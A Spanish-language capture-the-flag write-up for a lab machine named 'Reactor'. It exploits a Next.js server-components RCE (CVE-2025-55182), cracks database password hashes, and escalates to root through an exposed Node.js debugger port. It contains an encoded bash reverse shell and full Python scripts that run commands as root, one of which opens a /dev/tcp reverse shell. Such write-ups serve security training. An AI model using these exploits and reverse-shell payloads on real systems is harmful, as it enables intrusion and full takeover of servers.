
# Reactor

<figure><img src="/files/6Y9SxbQ4uaSMNn6ZD6ye" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Reactor`
* **IP:** `10.129.5.154`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `25/05/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.5.154 reactor.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sCV -T5 10.129.5.154
```

{% code overflow="wrap" %}

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Mon, 25 May 2026 14:06:03 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 25 May 2026 14:06:03 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```

{% endcode %}

Solo los puertos (22 y 3000) abiertos. Nos llama la atención de primeras el puerto 300, por lo que accederemos para ver de lo que se trata.

### Acceso Web

Accedemos a `http://10.129.5.154:3000/` y observamos que parece ser un sistema de monitorización de un reactor nuclear "`ReactorWatch v.3.2.1`", que controla la temperatura, presión etc...

<figure><img src="/files/56baVKPme0t5BGDG4shT" alt=""><figcaption></figcaption></figure>

El escaneo con scripts de Nmap reveló algún archivo JS de nextjs, por lo que intuimos que es una aplicación en NextJS.

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Escaneo de puertos y servicios con Nmap
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de subdominios con ffuf
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Nuclei

El escaneo de Nuclei marca como critical que el objetivo es vulnerable al `CVE-2025-55182`, que nos permitiría conseguir RCE en el objetivo debido a una falla de seguridad en los componentes de NextJS:

<table><thead><tr><th width="114.148193359375">Severidad</th><th width="168.03704833984375">Template</th><th width="246.0740966796875">Nombre</th><th>URL</th></tr></thead><tbody><tr><td>CRITICAL</td><td>CVE-2025-55182</td><td>React Server Components - Remote Code Execution</td><td>http://10.129.5.154:3000</td></tr></tbody></table>

***

## <mark style="color:$primary;">Explotación</mark>

### CVE-2025-55182

{% embed url="<https://github.com/Chocapikk/CVE-2025-55182>" %}

```bash
git clone https://github.com/Chocapikk/CVE-2025-55182.git
cd CVE-2025-55182
pip3 install -r requirements.txt
```

Ejecutamos el exploit con el siguiente comando, y comprobamos que ejecuta correctamente el comando "id"

```bash
python3 exploit.py -u http://10.129.5.154:3000 -c "id"
Success
uid=999(node) gid=988(node) groups=988(node)
```

### Reverse Shell

Usaremos Penelope para recibir una reverse shell y tener persistencia:

{% embed url="<https://github.com/brightio/penelope>" %}

```bash
pipx install git+https://github.com/brightio/penelope

penelope
```

<figure><img src="/files/QFe2CD0y7qzQGRsfXtv4" alt=""><figcaption></figcaption></figure>

Usaremos el payload en bash de la sección `tun0`, ya que estamos conectados por VPN:

```bash
➤  tun0 → 10.10.14.163:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTYzLzQ0NDQgMD4mMSkgJg==|base64 -d|bash
```

Lo ejecutamos desde el exploit y recibimos la shell:

```bash
python3 exploit.py -u http://10.129.5.154:3000 -c "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTYzLzQ0NDQgMD4mMSkgJg==|base64 -d|bash"
```

<figure><img src="/files/qzMMZZ7zgImsbaDKk04Z" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Con F12 podemos cerrar la sesión para interactuar con ella más tarde
{% endhint %}

Estamos dentro, pero no podemos acceder a la carpeta engineer de la home, que es donde está la user flag:

{% code overflow="wrap" %}

```bash
node@reactor:/opt/reactor-app$ cd /home
node@reactor:/home$ ls
engineer  node
node@reactor:/home$ cd engineer/
bash: cd: engineer/: Permission denied
```

{% endcode %}

***

## <mark style="color:$primary;">User Flag</mark>

En `/opt/reactor-app` encontramos un archivo `.env` que expone la ruta de la base de datos en sqlite3 y las API Keays del sensor y un webhook:

```bash
node@reactor:/opt/reactor-app$ cat .env
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

### Enumeración de la base de datos

Encontramos las tablas users y sensor\_logs, y dentro de users tenemos los hashes de admin y de engineer:

{% code overflow="wrap" %}

```bash
node@reactor:/opt/reactor-app$ sqlite3 /opt/reactor-app/reactor.db ".tables"
sensor_logs  users      

node@reactor:/opt/reactor-app$ sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

{% endcode %}

### Cracking de hashes

Conseguimos crackear fácilmente el hash de engineer con CrackStation:

<figure><img src="/files/csW9ruIu0gq7qSLChV1U" alt=""><figcaption></figcaption></figure>

### Acceso SSH

Accedemos por SSH con la contraseña o cambiamos al usuario engineer desde la reverse shell y obtenemos la user flag:

{% code overflow="wrap" %}

```bash
node@reactor:~$ su engineer
Password: 
engineer@reactor:/home/node$ whoami
engineer
engineer@reactor:/home/node$ cd /home/engineer/
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt 
6595538f4ddb189fc1de9e60********
```

{% endcode %}

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Oliver:

```bash
engineer@reactor:~$ sudo -l
[sudo] password for engineer: 
Sorry, user engineer may not run sudo on reactor.
```

### Servicios internos corriendo

Hay un servicio escuchando en `127.0.0.1:9229`, que es el puerto por defecto del inspector de Node.js (debugger).

```bash
engineer@reactor:~$ ss -tuln

Netid    State     Recv-Q    Send-Q       Local Address:Port       Peer Address:Port   Process    
udp      UNCONN    0         0               127.0.0.54:53              0.0.0.0:*                 
udp      UNCONN    0         0            127.0.0.53%lo:53              0.0.0.0:*                 
udp      UNCONN    0         0                  0.0.0.0:68              0.0.0.0:*                 
tcp      LISTEN    0         4096               0.0.0.0:22              0.0.0.0:*                 
tcp      LISTEN    0         4096            127.0.0.54:53              0.0.0.0:*                 
tcp      LISTEN    0         511              127.0.0.1:9229            0.0.0.0:*                 
<----SNIP---->
```

### Explotacion del debugger de Node.js

#### 1. Identificación del vector

Tras obtener acceso como el usuario `engineer`, ejecutamos `ss -tuln` y observamos:

```bash
tcp   LISTEN  0  511   127.0.0.1:9229  0.0.0.0:*
```

El puerto **9229** es el puerto por defecto del inspector de Node.js (`--inspect`). Vimos que el proceso asociado era `/opt/uptime-monitor/worker.js` y, comprobando sus permisos:

```bash
ls -la /opt/uptime-monitor/worker.js
# -rw-r--r-- 1 root root ...
ps aux | grep worker.js
# node /opt/uptime-monitor/worker.js   (PID 1385, ejecutándose como root)
```

El archivo CSV de logs `/var/log/uptime-monitor.csv` también era propiedad de `root`, confirmando que el proceso `worker.js` se ejecutaba con privilegios de superusuario.

#### 2. Conexión al inspector vía WebSocket

El inspector de Node.js expone una API WebSocket que permite ejecutar comandos JavaScript dentro del proceso. Para conectarnos necesitamos:

* La URL del WebSocket, que obtenemos con `curl http://127.0.0.1:9229/json`:

```json
[{
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/4ec66a3d-f8e7-4fc7-99fb-d49a59b3e5d4"
}]
```

* Realizar un handshake HTTP/1.1 de upgrade a WebSocket (Sec-WebSocket-Key).

#### 3. Script completo de explotación

El siguiente script Python (sin dependencias externas) se conecta, envía comandos y recupera la flag de root.

```python
#!/usr/bin/env python3
import socket
import base64
import os
import json
import time
import struct

def encode_frame(payload_bytes, opcode=0x1):
    """Codifica un frame WebSocket con mascara (cliente -> servidor)"""
    frame = bytearray()
    frame.append(0x80 | opcode)          # FIN + opcode texto
    mask_bit = 0x80
    length = len(payload_bytes)
    if length <= 125:
        frame.append(mask_bit | length)
    elif length <= 65535:
        frame.append(mask_bit | 126)
        frame.extend(length.to_bytes(2, 'big'))
    else:
        frame.append(mask_bit | 127)
        frame.extend(length.to_bytes(8, 'big'))
    mask = os.urandom(4)
    frame.extend(mask)
    masked = bytearray([payload_bytes[i] ^ mask[i % 4] for i in range(length)])
    frame.extend(masked)
    return frame

def decode_frames(data):
    """Decodifica frames WebSocket del servidor (sin mascara)"""
    frames = []
    i = 0
    while i < len(data):
        if len(data) - i < 2:
            break
        i += 1   # skip fin/opcode
        mask_len = data[i]
        masked = (mask_len & 0x80) != 0
        length = mask_len & 0x7F
        i += 1
        if length == 126:
            length = struct.unpack('>H', data[i:i+2])[0]
            i += 2
        elif length == 127:
            length = struct.unpack('>Q', data[i:i+8])[0]
            i += 8
        if masked:
            # Teóricamente el servidor nunca debería enviar frames enmascarados, pero por si acaso
            mask = data[i:i+4]
            i += 4
            payload = bytearray()
            for j in range(length):
                payload.append(data[i+j] ^ mask[j%4])
            frames.append(payload.decode('utf-8', errors='ignore'))
            i += length
        else:
            frames.append(data[i:i+length].decode('utf-8', errors='ignore'))
            i += length
    return frames

host, port, path = "127.0.0.1", 9229, "/4ec66a3d-f8e7-4fc7-99fb-d49a59b3e5d4"

# Conexión TCP y handshake WebSocket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
key = base64.b64encode(os.urandom(16)).decode()
handshake = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n\r\n"
)
s.send(handshake.encode())
resp = s.recv(4096)
if b"101" not in resp:
    print("Handshake failed")
    exit(1)
print("[+] Handshake OK")

# Habilitar Runtime del inspector
s.send(encode_frame(json.dumps({"id": 1, "method": "Runtime.enable"}).encode()))
time.sleep(0.2)
s.recv(8192)   # descartar respuesta

# Ejecutar comando para leer /root/root.txt
# Nota: en el contexto del inspector, 'require' no está directamente definido,
# pero podemos acceder a través de process.mainModule.require
cmd = "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()"
msg = {
    "id": 2,
    "method": "Runtime.evaluate",
    "params": {"expression": cmd, "returnByValue": True}
}
s.send(encode_frame(json.dumps(msg).encode()))
time.sleep(0.5)

# Recibir y procesar respuesta
data = s.recv(8192)
for frame in decode_frames(data):
    if '"result"' in frame:
        try:
            obj = json.loads(frame)
            if "result" in obj and "result" in obj["result"]:
                print("[+] Root flag:", obj["result"]["result"]["value"])
        except:
            pass
s.close()
```

#### 4. Explicación del funcionamiento

1. **Handshake WebSocket**: El script envía una petición HTTP con las cabeceras de upgrade. El servidor responde con `101 Switching Protocols`, estableciendo el canal.
2. **Runtime.enable**: Activa el dominio `Runtime` del protocolo Chrome DevTools, necesario para evaluar expresiones.
3. **Runtime.evaluate**: Envía un comando JavaScript que se ejecuta **dentro del proceso Node.js** (como root). Se utiliza `process.mainModule.require` porque `require` global no está definido en el contexto del inspector.
4. **Captura de la salida**: La respuesta incluye la propiedad `result.result.value` con el contenido del comando.

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

### Lectura de archivos (root.txt)

```bash
engineer@reactor:/tmp$ python3 exploit.py 
[+] Handshake OK
[+] Root flag: dbc52041ca2b1f80bede0657********
```

### Reverse Shell como Root

Podemos modificar el script para conseguir una shell como root:

{% code overflow="wrap" %}

```python
cat > /tmp/revshell_root.py << 'EOF'
#!/usr/bin/env python3
import socket
import base64
import os
import json
import time
import struct

def encode_frame(payload_bytes, opcode=0x1):
    frame = bytearray()
    frame.append(0x80 | opcode)
    mask_bit = 0x80
    length = len(payload_bytes)
    if length <= 125:
        frame.append(mask_bit | length)
    elif length <= 65535:
        frame.append(mask_bit | 126)
        frame.extend(length.to_bytes(2, 'big'))
    else:
        frame.append(mask_bit | 127)
        frame.extend(length.to_bytes(8, 'big'))
    mask = os.urandom(4)
    frame.extend(mask)
    masked = bytearray([payload_bytes[i] ^ mask[i % 4] for i in range(length)])
    frame.extend(masked)
    return frame

def decode_frames(data):
    frames = []
    i = 0
    while i < len(data):
        if len(data) - i < 2:
            break
        i += 1
        mask_len = data[i]
        masked = (mask_len & 0x80) != 0
        length = mask_len & 0x7F
        i += 1
        if length == 126:
            length = struct.unpack('>H', data[i:i+2])[0]
            i += 2
        elif length == 127:
            length = struct.unpack('>Q', data[i:i+8])[0]
            i += 8
        if masked:
            mask = data[i:i+4]
            i += 4
            payload = bytearray()
            for j in range(length):
                payload.append(data[i+j] ^ mask[j%4])
            frames.append(payload.decode('utf-8', errors='ignore'))
            i += length
        else:
            frames.append(data[i:i+length].decode('utf-8', errors='ignore'))
            i += length
    return frames

host, port, path = "127.0.0.1", 9229, "/4ec66a3d-f8e7-4fc7-99fb-d49a59b3e5d4"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
key = base64.b64encode(os.urandom(16)).decode()
handshake = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n\r\n"
)
s.send(handshake.encode())
resp = s.recv(4096)
if b"101" not in resp:
    print("Handshake failed")
    exit(1)
print("[+] Handshake OK")

s.send(encode_frame(json.dumps({"id": 1, "method": "Runtime.enable"}).encode()))
time.sleep(0.2)
s.recv(8192)

# Payload reverse shell con bash al puerto 5555 (cambia la IP si es necesario)
payload = "process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.163/5555 0>&1\"')"

msg = {
    "id": 2,
    "method": "Runtime.evaluate",
    "params": {"expression": payload, "returnByValue": True}
}
s.send(encode_frame(json.dumps(msg).encode()))
print("[+] Payload enviado. Revisa tu netcat en el puerto 5555")
time.sleep(2)
s.close()
EOF

python3 /tmp/revshell_root.py
```

{% endcode %}

<figure><img src="/files/zEmXis5mwLaCvePum3ZC" alt=""><figcaption></figcaption></figure>
